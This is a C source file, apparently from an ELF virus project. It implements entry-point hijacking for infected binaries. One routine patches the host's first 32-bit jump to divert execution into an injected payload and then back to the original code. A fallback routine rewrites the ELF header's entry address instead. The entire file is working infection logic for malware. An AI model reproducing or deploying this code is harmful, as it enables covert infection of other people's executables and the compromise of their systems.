#include "virus.h"
#include "disasm.h"
#include "disasm_utils.h"
#include "jumps.h"
#include "compiler_utils.h"
#include "errors.h"
#include "log.h"

static bool	change_header_entry(struct safe_ptr clone_ref,
			const struct entry *file_entry,
			size_t dist_clientjmp_loader)
{
	log_trying_change_header_entry();

	Elf64_Ehdr	*hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));

	if (!hdr) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	const size_t	payload_offset     = file_entry->payload_offset;
	const size_t	payload_addr       = file_entry->payload_addr;
	const size_t	entry_addr         = file_entry->entry_addr;
	const size_t	dist_payload_entry = payload_addr - entry_addr;

	const size_t	loader_jump_offset = payload_offset + dist_clientjmp_loader;
	const void	*loader_entry = safe(clone_ref, payload_offset, 0);
	const void	*loader_jump  = safe(clone_ref, loader_jump_offset, JUMP32_INST_SIZE);

	if (loader_entry == NULL || loader_jump == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);

	const size_t	loader_jump_addr  = payload_addr + (loader_jump - loader_entry);
	const size_t	loader_jump_value = (int32_t)(entry_addr - (loader_jump_addr + JUMP32_INST_SIZE));

	if (!write_jmp32(clone_ref, loader_jump_offset, loader_jump_value))
		return false;

	hdr->e_entry += dist_payload_entry;

	return true;
}

static bool	change_client_jump(struct safe_ptr clone_ref,
			const struct entry *file_entry,
			size_t dist_clientjmp_loader)
{
	log_trying_change_client_jump();

	const size_t	entry_offset   = file_entry->entry_offset;
	const size_t	payload_offset = file_entry->payload_offset;
	const size_t	entry_addr     = file_entry->entry_addr;
	const size_t	payload_addr   = file_entry->payload_addr;

	// get client entry and jump pointers
	const void	*client_entry = safe(clone_ref, entry_offset, 0);
	const void	*client_jump  = find_first_jmp32(clone_ref, entry_offset);

	if (client_jump == NULL || client_entry == NULL)
		return errors(ERR_THROW, _ERR_T_CHANGE_CLIENT_JUMP);

	// get loader entry and jump pointers
	const size_t	loader_jump_offset = payload_offset + dist_clientjmp_loader;
	const void	*loader_entry = safe(clone_ref, payload_offset, 0);
	const void	*loader_jump  = safe(clone_ref, loader_jump_offset, JUMP32_INST_SIZE);

	if (loader_jump == NULL || loader_entry == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);

	// get client jump destination
	const size_t	client_jump_offset = client_jump - clone_ref.ptr;
	const void	*client_jump_dst   = get_jmp32_destination(clone_ref, client_jump_offset);

	if (client_jump_dst == NULL)
		return errors(ERR_THROW, _ERR_T_CHANGE_CLIENT_JUMP);

	// compute new values for client and loader jumps
	const size_t	loader_jump_addr     = payload_addr + (loader_jump - loader_entry);
	const size_t	client_jump_addr     = entry_addr + (client_jump - client_entry);
	const size_t	client_jump_dst_addr = entry_addr + (client_jump_dst - client_entry);

	const int32_t	loader_jump_value = (int32_t)(client_jump_dst_addr - (loader_jump_addr + JUMP32_INST_SIZE));
	const int32_t	client_jump_value = (int32_t)(payload_addr - (client_jump_addr + JUMP32_INST_SIZE));

	// write values
	if (!write_jmp32(clone_ref, loader_jump_offset, loader_jump_value)
	|| !write_jmp32(clone_ref, client_jump_offset, client_jump_value))
		return errors(ERR_THROW, _ERR_T_CHANGE_CLIENT_JUMP);

	return true;
}

bool	change_entry(struct safe_ptr clone_ref, const struct entry *file_entry,
		size_t dist_clientjmp_loader)
{
	if (!change_client_jump(clone_ref, file_entry, dist_clientjmp_loader)
	&& !change_header_entry(clone_ref, file_entry, dist_clientjmp_loader))
		return errors(ERR_THROW, _ERR_T_CHANGE_ENTRY);

	return true;
}
